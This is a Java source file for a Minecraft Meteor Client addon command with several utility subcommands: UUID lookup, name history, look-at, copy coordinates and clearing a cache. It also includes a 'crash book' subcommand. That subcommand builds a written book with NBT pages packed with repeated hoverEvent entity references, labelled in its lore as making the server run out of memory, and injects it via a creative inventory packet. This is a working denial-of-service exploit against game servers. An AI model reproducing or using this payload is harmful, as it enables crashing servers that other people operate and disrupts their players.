package io.github.racoondog.bidoofmeteor.commands;

import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import io.github.racoondog.bidoofmeteor.commands.arguments.PlayerArgumentType;
import io.github.racoondog.bidoofmeteor.commands.arguments.Vec3ArgumentType;
import io.github.racoondog.bidoofmeteor.impl.PlayerHeadCacheImpl;
import io.github.racoondog.bidoofmeteor.util.ApiUtils;
import io.github.racoondog.bidoofmeteor.util.ChatUtils;
import meteordevelopment.meteorclient.systems.commands.Command;
import meteordevelopment.meteorclient.utils.network.MeteorExecutor;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.command.CommandSource;
import net.minecraft.command.argument.EntityAnchorArgumentType;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.util.math.Vec3d;

import static com.mojang.brigadier.Command.SINGLE_SUCCESS;

@Environment(EnvType.CLIENT)
public class BidoofCommand extends Command {
    public BidoofCommand() {
        super("bidoof", "bidoof");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> builder) {
        builder.then(literal("flushCache").executes(BidoofCommand::clearCache))
            .then(literal("getUuid").then(argument("username", PlayerArgumentType.username()).executes(BidoofCommand::getUuid)))
            .then(literal("nameHistory")
                .then(literal("username").then(argument("username", PlayerArgumentType.username()).executes(NameHistoryCommand::username)))
                .then(literal("uuid").then(argument("uuid", PlayerArgumentType.uuid()).executes(NameHistoryCommand::uuid))))
            .then(literal("lookAt").then(argument("location", Vec3ArgumentType.vec3()).executes(BidoofCommand::lookAt)))
            .then(literal("copyCoords").executes(BidoofCommand::copyCoords))
            .then(literal("crash")
                .then(literal("book").executes(BidoofCommand::bookCrash)))
        ;
    }

    private static int bookCrash(CommandContext<CommandSource> context) throws CommandSyntaxException {
        ItemStack crash = new ItemStack(Items.WRITTEN_BOOK, 1);
        final String playername = mc.player.getDisplayName().getString();
        NbtCompound nbtCompound = StringNbtReader.parse("{display:{Lore:['{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"gray\",\"text\":\"Open book to make\"}],\"text\":\"\"}','{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"gray\",\"text\":\"Server runs out of memory\"}],\"text\":\"\"}'],Name:'{\"extra\":[{\"bold\":false,\"italic\":false,\"underlined\":false,\"strikethrough\":false,\"obfuscated\":false,\"color\":\"magenta\",\"text\":\"Book Crash\"}],\"text\":\"\"}'},title:\"\",author:\"\",pages:['{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}','{\"text\":\"text\",\"hoverEvent\":{\"action\":\"show_text\",\"contents\":[{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"},{\"nbt\":\"\",\"entity\":\"" + playername + "\"}]}}']}");
        crash.setNbt(nbtCompound);
        mc.getNetworkHandler().sendPacket(new CreativeInventoryActionC2SPacket(-106, crash));
        ChatUtils.info("Book Created.");
        return SINGLE_SUCCESS;
    }

    private static int copyCoords(CommandContext<CommandSource> context) {
        assert mc.player != null;
        mc.keyboard.setClipboard(mc.player.getBlockPos().getX() + ", " + mc.player.getBlockPos().getY() + ", " + mc.player.getBlockPos().getZ());
        ChatUtils.info("Coordinates copied to the clipboard.");
        return SINGLE_SUCCESS;
    }

    private static int lookAt(CommandContext<CommandSource> context) {
        Vec3d target = Vec3ArgumentType.getCVec3(context, "location");
        assert mc.player != null;
        mc.player.lookAt(EntityAnchorArgumentType.EntityAnchor.FEET, target);
        ChatUtils.info("Looking at (highlight)%s(default), (highlight)%s(default), (highlight)%s(default).", target.x, target.y, target.z);
        return SINGLE_SUCCESS;
    }

    private static int clearCache(CommandContext<CommandSource> context) {
        PlayerHeadCacheImpl.DYNAMIC_PLAYER_HEAD_CACHE.clear();
        ChatUtils.info("Cleared Better Chat head cache.");
        return SINGLE_SUCCESS;
    }

    //todo replace warning with CommandSyntaxException
    private static int getUuid(CommandContext<CommandSource> context) {
        MeteorExecutor.execute(() -> {
            String username = PlayerArgumentType.getUsername(context, "username");
            String uuid = ApiUtils.uuidFromName(username);
            if (uuid == null) {
                ChatUtils.warning("(highlight)%s(default) did not return a UUID. (highlight)Invalid name?(default)", username);
            } else {
                ChatUtils.info("(highlight)%s(default)'s UUID is (highlight)%s(default).", username, uuid);
            }
        });
        return SINGLE_SUCCESS;
    }
}
